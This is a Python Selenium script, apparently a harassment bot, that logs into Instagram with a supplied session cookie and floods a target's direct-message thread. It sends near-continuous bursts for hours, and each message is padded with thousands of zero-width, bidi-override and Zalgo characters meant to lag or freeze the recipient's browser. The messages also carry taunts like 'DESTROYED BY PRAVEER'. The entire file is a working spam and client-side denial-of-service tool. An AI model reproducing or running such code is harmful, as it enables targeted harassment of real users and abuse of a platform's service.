# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (MAX IMPACT)
# 📅 STATUS: DOM KILLER | 2 THREADS | HYPER-BURST

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- HYPER-IMPACT CONFIG ---
THREADS = 2             
TOTAL_DURATION = 21600  
BURST_SPEED = (0.01, 0.05) # Extreme speed (No delay)
SESSION_LIMIT = 120     

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()

def get_max_impact_payload(target):
    """Generates a massive memory-bloating payload."""
    # Recursive Zalgo (Strips of overlapping marks)
    z = "̸" * 15
    praveer_glitch = "".join(c + z for c in "PRAVEER_OWNZ")
    
    # 2500+ Char Buffer (The 'Lag Brick')
    # Using specific Unicode blocks that force complex browser calculations
    bloat_chars = ["\u200B", "\u200C", "\u200D", "\u200E", "\u202E", "\u2060"]
    bloat = "".join(random.choice(bloat_chars) for _ in range(2500))
    
    # Construction of the DOM Overload
    payload = (
        f"🔥 {target.upper()} DESTROYED BY PRAVEER 🔥\n" +
        f"{bloat}\n" +
        f"{praveer_glitch}\n" * 5 + 
        f"{bloat}\n" +
        "🛑" * 50
    )
    return payload

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new") 
    chrome_options.add_argument("--no-sandbox") 
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    
    # Standard PC Emulation for higher data throughput
    chrome_options.add_argument("--window-size=1920,1080")
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"max_praveer_{agent_id}_{int(time.time())}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")

    driver = webdriver.Chrome(options=chrome_options)
    driver.custom_temp_path = temp_dir
    return driver

def adaptive_inject(driver, text):
    try:
        # Direct Injection: Bypasses 'typing' lag entirely
        box = driver.find_element(By.XPATH, "//div[@role='textbox']")
        driver.execute_script("""
            var el = arguments[0];
            el.focus();
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, box, text)
        box.send_keys(Keys.ENTER)
        return True
    except:
        return False

def run_life_cycle(agent_id, cookie, target):
    global GLOBAL_SENT
    start_time = time.time()

    while (time.time() - start_time) < TOTAL_DURATION:
        driver = None
        temp_path = None
        session_start = time.time()
        
        try:
            driver = get_driver(agent_id)
            temp_path = getattr(driver, 'custom_temp_path', None)
            
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(5)

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_max_impact_payload(os.getenv("TARGET_NAME", "User"))
                if adaptive_inject(driver, payload):
                    with COUNTER_LOCK:
                        GLOBAL_SENT += 1
                        print(f"[!] IMPACT {GLOBAL_SENT} | PRAVEER DOM KILLER ACTIVE", flush=True)
                
                # Zero to minimal delay for maximum pressure
                time.sleep(random.uniform(*BURST_SPEED))

        except Exception:
            pass # Keep alive at all costs
        finally:
            if driver: driver.quit()
            if temp_path and os.path.exists(temp_path): shutil.rmtree(temp_path, ignore_errors=True)
            gc.collect()
            time.sleep(2)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__":
    main()
